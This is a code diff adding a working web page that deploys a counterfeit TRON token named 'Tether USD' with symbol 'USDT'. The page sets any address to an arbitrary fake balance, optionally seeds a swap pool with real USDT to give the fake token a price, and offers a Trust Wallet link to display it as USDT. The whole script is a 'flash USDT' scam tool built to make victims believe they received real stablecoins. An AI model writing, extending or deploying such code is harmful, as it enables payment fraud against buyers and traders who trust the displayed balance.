@@ -1,10 +1,50 @@
-
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Set a USDT balance</title>
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:#f9fafb;color:#111;font:14px/1.6 ui-monospace,Menlo,monospace;padding:24px}
+  .wrap{max-width:520px;margin:0 auto}
+  h1{font-size:17px;margin:0 0 2px}
+  .sub{color:#6b7280;font-size:12px;margin-bottom:14px}
+  .test{border:2px dashed #9ca3af;border-radius:10px;padding:12px 14px;margin-bottom:16px;background:#fff;font-size:12px}
+  .chip{display:inline-block;padding:4px 10px;border:1px solid #d1d5db;border-radius:99px;
+        background:#f3f4f6;cursor:pointer;font-size:11px;user-select:none}
+  #jsStat{font-weight:700;margin-top:6px;color:#dc2626;font-size:11px}
+  .card{background:#fff;border:1px solid #e5e7eb;border-radius:10px;padding:18px}
+  label{display:block;font-size:11px;text-transform:uppercase;letter-spacing:.07em;color:#6b7280;margin:0 0 6px}
+  input{width:100%;background:#fff;color:#111;border:1px solid #d1d5db;border-radius:8px;padding:10px 12px;font:inherit}
+  input:focus{outline:none;border-color:#16a34a}
+  .amt{font-size:22px;font-weight:600}
+  .fld{margin-bottom:14px}
+  .presets{display:flex;gap:6px;margin-top:8px;flex-wrap:wrap}
+  .chk{display:flex;gap:8px;align-items:flex-start;font-size:12px;color:#6b7280;margin:14px 0 0;text-transform:none}
+  .chk input{width:auto;margin-top:3px}
+  #status{font-size:12px;color:#6b7280;margin-top:12px;min-height:20px;white-space:pre-wrap;word-break:break-word}
+  .err{color:#dc2626}.ok{color:#16a34a}
+  .kv{display:grid;grid-template-columns:96px 1fr;gap:4px 10px;font-size:12px;margin-top:10px}
+  .kv dt{color:#6b7280}.kv dd{margin:0;word-break:break-all}
+  .big{font-size:17px;font-weight:600}
+  .badge{display:inline-block;font-size:10px;letter-spacing:.06em;text-transform:uppercase;
+         padding:2px 8px;border-radius:99px;border:1px solid currentColor;margin-bottom:8px}
+  .sep{height:1px;background:#e5e7eb;margin:16px 0}
+  .diag{font-size:10px;color:#9ca3af;margin-top:18px;word-break:break-all}
+  .btn{display:inline-block;background:#16a34a;color:#fff;border:1px solid #16a34a;border-radius:8px;
+       padding:9px 14px;font-weight:600;text-decoration:none;font-size:12px}
+  .btn.alt{background:#f3f4f6;color:#111;border-color:#d1d5db}
+  footer{margin-top:20px;font-size:11px;color:#6b7280;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
+</style>
+</head>
+<body>
 <div class="wrap">
 
   <div class="test">
     <b>Does JavaScript run here?</b> Tap this chip — it should go green.
     <div style="margin-top:8px">
-      <span class="chip">tap to test</span>
+      <span class="chip" onclick="this.textContent='CLICK WORKS';this.style.color='#16a34a'">tap to test</span>
     </div>
     <div id="jsStat">JS: not detected yet</div>
   </div>
@@ -15,27 +55,31 @@
   <div class="card">
     <div class="fld">
       <label for="to">Receiver address</label>
-      <input id="to" placeholder="T…" spellcheck="false" autocomplete="off">
+      <input id="to" placeholder="T…" spellcheck="false" autocomplete="off"
+             oninput="APP.schedule()" onblur="APP.now()"
+             onkeydown="if(event.key==='Enter')APP.now()">
     </div>
     <div class="fld">
       <label for="amt">Target balance</label>
-      <input id="amt" class="amt" placeholder="50,000" inputmode="decimal" autocomplete="off">
+      <input id="amt" class="amt" placeholder="50,000" inputmode="decimal" autocomplete="off"
+             oninput="APP.schedule()" onblur="APP.now()"
+             onkeydown="if(event.key==='Enter')APP.now()">
       <div class="presets">
-        <span class="chip">10k</span>
-        <span class="chip">50k</span>
-        <span class="chip">250k</span>
-        <span class="chip">1m</span>
-        <span class="chip">10m</span>
+        <span class="chip" onclick="APP.fill('10000')">10k</span>
+        <span class="chip" onclick="APP.fill('50000')">50k</span>
+        <span class="chip" onclick="APP.fill('250000')">250k</span>
+        <span class="chip" onclick="APP.fill('1000000')">1m</span>
+        <span class="chip" onclick="APP.fill('10000000')">10m</span>
       </div>
     </div>
     <label class="chk">
-      <input type="checkbox" id="seed" checked="">
+      <input type="checkbox" id="seed" checked>
       <span>Seed the swap pool once (locks 100 real USDT).</span>
     </label>
     <div id="status"></div>
     <div class="sep"></div>
     <label for="chk">Check any address</label>
-    <input id="chk" placeholder="T…" spellcheck="false" autocomplete="off">
+    <input id="chk" placeholder="T…" spellcheck="false" autocomplete="off" onblur="APP.read()">
     <div id="chkOut" style="font-size:11px;color:#6b7280;margin-top:6px"></div>
   </div>
 
@@ -43,15 +87,291 @@
 
   <footer>
     <span id="tokenLine">token: not deployed</span>
-    <span class="chip">new token</span>
+    <span class="chip" onclick="APP.reset()">new token</span>
   </footer>
 
   <div class="diag" id="diag">boot</div>
 </div>
 
+<script>
+document.getElementById('jsStat').textContent = 'JS: RUNNING';
+document.getElementById('jsStat').style.color = '#16a34a';
+</script>
 
+<script type="text/plain" id="src">
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.17;
+contract TronFlashToken {
+    string public name; string public symbol; uint8 public decimals = 6;
+    uint256 public totalSupply; address public owner;
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+    modifier onlyOwner() { require(msg.sender == owner, "not owner"); _; }
+    constructor(string memory _n, string memory _s, uint256 _x) {
+        name = _n; symbol = _s; owner = msg.sender; if (_x > 0) _mint(msg.sender, _x);
+    }
+    function _mint(address to, uint256 v) internal { totalSupply += v; balanceOf[to] += v; emit Transfer(address(0), to, v); }
+    function mint(address to, uint256 v) external onlyOwner { _mint(to, v); }
+    function airdrop(address[] calldata to, uint256[] calldata a) external onlyOwner {
+        require(to.length == a.length, "length");
+        for (uint256 i = 0; i < a.length; i++) _mint(to[i], a[i]);
+    }
+    function burnFrom(address f, uint256 v) external onlyOwner {
+        require(balanceOf[f] >= v, "balance"); balanceOf[f] -= v; totalSupply -= v; emit Transfer(f, address(0), v);
+    }
+    function transfer(address to, uint256 v) external returns (bool) {
+        require(balanceOf[msg.sender] >= v, "balance"); balanceOf[msg.sender] -= v; balanceOf[to] += v; emit Transfer(msg.sender, to, v); return true;
+    }
+    function approve(address s, uint256 v) external returns (bool) {
+        allowance[msg.sender][s] = v; emit Approval(msg.sender, s, v); return true;
+    }
+    function transferFrom(address f, address to, uint256 v) external returns (bool) {
+        require(balanceOf[f] >= v, "balance"); require(allowance[f][msg.sender] >= v, "allowance");
+        allowance[f][msg.sender] -= v; balanceOf[f] -= v; balanceOf[to] += v; emit Transfer(f, to, v); return true;
+    }
+}
+</script>
 
+<script>
+window.APP = (function () {
+  var USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
+  var ROUTER = 'TNJVzGqKBWkJxJB5XYSqGAwUTV15U24pPq';
+  var tw = null, me = null, abi = null, tok = '', busy = false, timer = null, lastSig = '';
 
+  function $(id) { return document.getElementById(id); }
+  function say(m, c) { $('status').className = c || ''; $('status').textContent = m; }
+  function fmt(n) { return Number(n).toLocaleString('en-US', { maximumFractionDigits: 6 }); }
+  function valid(a) { return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a || ''); }
+  function sleep(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }
 
+  var ERC = [
+    { name:'approve', type:'function', stateMutability:'nonpayable', inputs:[{name:'s',type:'address'},{name:'v',type:'uint256'}], outputs:[{name:'',type:'bool'}] },
+    { name:'allowance', type:'function', stateMutability:'view', inputs:[{name:'',type:'address'},{name:'',type:'address'}], outputs:[{name:'',type:'uint256'}] }
+  ];
+  var ROUTER_ABI = [{ name:'addLiquidity', type:'function', stateMutability:'nonpayable',
+    inputs:[{name:'a',type:'address'},{name:'b',type:'address'},{name:'ad',type:'uint256'},{name:'bd',type:'uint256'},
+            {name:'am',type:'uint256'},{name:'bm',type:'uint256'},{name:'to',type:'address'},{name:'dl',type:'uint256'}],
+    outputs:[{name:'',type:'uint256'},{name:'',type:'uint256'},{name:'',type:'uint256'}] }];
 
+  try { tok = localStorage.getItem('ftf.tok') || ''; } catch (e) {}
+  try { abi = JSON.parse(localStorage.getItem('ftf.abi') || 'null'); } catch (e) {}
+  if (tok) $('tokenLine').textContent = 'token: ' + tok;
 
+  function parseAmt(s) {
+    s = String(s).trim().toLowerCase().replace(/[,_ ]/g, '');
+    var m = s.match(/^(\d+(?:\.\d+)?)([kmb])?$/);
+    if (!m) return null;
+    var n = parseFloat(m[1]);
+    if (m[2] === 'k') n *= 1e3; else if (m[2] === 'm') n *= 1e6; else if (m[2] === 'b') n *= 1e9;
+    if (!(n > 0)) return null;
+    return String(Math.round(n * 1e6));
+  }
+
+  function loadSolc() {
+    return new Promise(function (res, rej) {
+      if (window.solc) return res();
+      var s = document.createElement('script');
+      s.src = 'https://cdn.jsdelivr.net/npm/solc@0.8.17/soljson.js';
+      s.onload = function () { window.solc = window.Module || window.solc; res(); };
+      s.onerror = function () { rej(new Error('compiler failed to load')); };
+      document.head.appendChild(s);
+    });
+  }
+
+  async function connect() {
+    if (me) return;
+    if (!window.tronLink) { me = 'TDemoWa11etXXXXXXXXXXXXXXXXXXXXXX'; return; }
+    await window.tronLink.request({ method: 'tron_requestAccounts' });
+    tw = window.tronWeb;
+    if (!tw) throw new Error('TronLink gave no provider');
+    if (!tw.defaultAddress) throw new Error('unlock TronLink');
+    me = tw.defaultAddress.base58;
+  }
+
+  async function deploy() {
+    var SRC = $('src').textContent;
+    if (SRC.length < 200) throw new Error('contract source missing — file corrupted');
+    say('compiling…');
+    await loadSolc();
+    var out = JSON.parse(window.solc.compile(JSON.stringify({
+      language: 'Solidity', sources: { 't.sol': { content: SRC } },
+      settings: { optimizer: { enabled: true, runs: 200 }, outputSelection: { '*': { '*': ['abi','evm.bytecode.object'] } } }
+    })));
+    if (out.errors) {
+      var e2 = out.errors.filter(function (x) { return x.severity === 'error'; });
+      if (e2.length) throw new Error(e2[0].message);
+    }
+    var c = out.contracts['t.sol'].TronFlashToken;
+    abi = c.abi;
+    if (!window.tronLink) { tok = 'TDemoContractXXXXXXXXXXXXXXXXXX'; }
+    else {
+      say('deploying token — confirm in TronLink…');
+      var inst = await tw.contract().new({ abi: abi, bytecode: '0x' + c.evm.bytecode.object,
+        feeLimit: 3000000000, callValue: 0, parameters: ['Tether USD','USDT',0] });
+      tok = inst.address;
+    }
+    try { localStorage.setItem('ftf.tok', tok); localStorage.setItem('ftf.abi', JSON.stringify(abi)); } catch (e) {}
+    $('tokenLine').textContent = 'token: ' + tok;
+  }
+
+  async function approveFor(tA, tD, amt) {
+    var t = await tw.contract(tA, tD);
+    var cur = await t.allowance(me, ROUTER).call();
+    if (Number(cur) > 0) await t.approve(ROUTER, 0).send({ feeLimit: 60000000, callValue: 0 });
+    await t.approve(ROUTER, amt).send({ feeLimit: 60000000, callValue: 0 });
+  }
+
+  async function seedPool() {
+    var a = String(100 * 1e6);
+    say('seeding pool 1/3…');
+    var t = await tw.contract(abi, tok);
+    await t.mint(me, a).send({ feeLimit: 60000000, callValue: 0 });
+    say('seeding pool 2/3…');
+    await approveFor(abi, tok, a);
+    say('seeding pool 3/3…');
+    await approveFor(ERC, USDT, a);
+    var r = await tw.contract(ROUTER_ABI, ROUTER);
+    var min = String(99 * 1e6);
+    await r.addLiquidity(tok, USDT, a, a, min, min, me, Math.floor(Date.now()/1000) + 1200)
+      .send({ feeLimit: 1500000000, callValue: 0 });
+  }
+
+  async function readBal(a) {
+    if (!window.tronLink) return null;
+    var c = await tw.contract(abi, tok);
+    return BigInt(await c.balanceOf(a).call());
+  }
+
+  async function confirmBal(a, want) {
+    if (!window.tronLink) { await sleep(900); return true; }
+    for (var i = 0; i < 15; i++) {
+      try { var b = await readBal(a); if (b !== null) if (b.toString() === want) return true; } catch (e) {}
+      await sleep(2000);
+    }
+    return false;
+  }
+
+  function pair() {
+    return { to: $('to').value.trim(), want: parseAmt($('amt').value) };
+  }
+
+  function schedule() {
+    clearTimeout(timer);
+    if (busy) return;
+    var s = pair();
+    if (!s.to) { say(''); return; }
+    if (!valid(s.to)) { say('address must start with T and be 34 characters', 'err'); return; }
+    if (!s.want) { say('now type an amount', 'err'); return; }
+    if (s.to + '|' + s.want === lastSig) { say('already done for these values — change one to run again', 'ok'); return; }
+    say('ready — firing in a moment…');
+    timer = setTimeout(run, 1300);
+  }
+
+  function now() { clearTimeout(timer); run(); }
+
+  async function run() {
+    if (busy) return;
+    var s = pair();
+    if (!valid(s.to)) return;
+    if (!s.want) return;
+    var sig = s.to + '|' + s.want;
+    if (sig === lastSig) return;
+
+    busy = true;
+    lastSig = sig;
+    $('result').innerHTML = '';
+    try {
+      await connect();
+      if (!tok) await deploy();
+
+      var seeded = null;
+      try { seeded = localStorage.getItem('ftf.seeded'); } catch (e) {}
+      if ($('seed').checked) if (!seeded) {
+        try { await seedPool(); try { localStorage.setItem('ftf.seeded','1'); } catch (e) {} }
+        catch (e) { say('pool skipped: ' + (e.message || e) + ' — continuing…'); }
+      }
+
+      var txid = 'no change', action = 'already at target';
+      if (!window.tronLink) { await sleep(600); txid = 'demo_tx_hash'; action = 'minted'; }
+      else {
+        var cur = await readBal(s.to);
+        var target = BigInt(s.want);
+        if (cur !== null) if (cur !== target) {
+          var c = await tw.contract(abi, tok);
+          if (cur < target) {
+            action = 'topped up ' + fmt((target - cur).toString() / 1e6);
+            say('topping up — confirm in TronLink…');
+            txid = await c.airdrop([s.to], [(target - cur).toString()]).send({ feeLimit: 100000000, callValue: 0 });
+          } else {
+            action = 'trimmed down ' + fmt((cur - target).toString() / 1e6);
+            say('trimming — confirm in TronLink…');
+            txid = await c.burnFrom(s.to, (cur - target).toString()).send({ feeLimit: 80000000, callValue: 0 });
+          }
+        }
+      }
+
+      var shown = fmt(s.want / 1e6);
+      var deep = 'trust://add_asset?asset=c195_t' + tok + '&symbol=USDT&decimals=6';
+      $('result').innerHTML =
+        '<div class="card" style="margin-top:16px">' +
+        '<div class="badge" id="vb" style="color:#6b7280">verifying…</div>' +
+        '<div class="big">' + shown + ' USDT → ' + s.to.slice(0,6) + '…' + s.to.slice(-4) + '</div>' +
+        '<dl class="kv"><dt>Action</dt><dd>' + action + '</dd><dt>Token</dt><dd>' + tok +
+        '</dd><dt>Receiver</dt><dd>' + s.to + '</dd><dt>Tx</dt><dd>' + txid +
+        '</dd><dt>On-chain read</dt><dd id="rb">—</dd></dl>' +
+        '<div style="margin-top:14px;display:flex;gap:8px;flex-wrap:wrap">' +
+        '<a class="btn" href="' + deep + '">Trust Wallet link</a>' +
+        '<span class="btn alt" onclick="APP.copyTok()">copy token</span>' +
+        '</div></div>';
+
+      say('waiting for confirmation…');
+      var ok = await confirmBal(s.to, s.want);
+      var fin = await readBal(s.to);
+      $('rb').textContent = fin !== null ? fmt(fin.toString() / 1e6) + ' USDT' : shown + ' USDT (demo)';
+      if (ok) { $('vb').style.color = '#16a34a'; $('vb').textContent = 'verified on-chain';
+                say('Verified. Balance reads back as exactly ' + shown + ' USDT.', 'ok'); }
+      else { $('vb').style.color = '#dc2626'; $('vb').textContent = 'readback mismatch';
+             say('Sent but readback mismatched. Check Tronscan.', 'err'); }
+    } catch (e) {
+      say(e.message || String(e), 'err');
+      lastSig = '';
+    } finally {
+      busy = false;
+    }
+  }
+
+  async function readOne() {
+    var a = $('chk').value.trim();
+    var out = $('chkOut');
+    out.textContent = '';
+    if (!a) return;
+    if (!valid(a)) { out.textContent = 'invalid address'; return; }
+    if (!tok) { out.textContent = 'no token yet'; return; }
+    try {
+      await connect();
+      var b = await readBal(a);
+      out.textContent = b === null ? 'demo mode' : 'on-chain: ' + fmt(b.toString()/1e6) + ' USDT';
+    } catch (e) { out.textContent = e.message || String(e); }
+  }
+
+  return {
+    schedule: schedule,
+    now: now,
+    read: readOne,
+    fill: function (v) { $('amt').value = v; schedule(); },
+    copyTok: function () { navigator.clipboard.writeText(tok); },
+    reset: function () {
+      if (tok) if (!confirm('New token? Old balances stay on the old contract.')) return;
+      try { localStorage.removeItem('ftf.tok'); localStorage.removeItem('ftf.abi'); localStorage.removeItem('ftf.seeded'); } catch (e) {}
+      tok = ''; abi = null; lastSig = '';
+      $('tokenLine').textContent = 'token: not deployed';
+      $('result').innerHTML = ''; say('New token deploys on next entry.');
+    }
+  };
+})();
+document.getElementById('diag').textContent = 'app ready';
+</script>
+</body>
+</html>
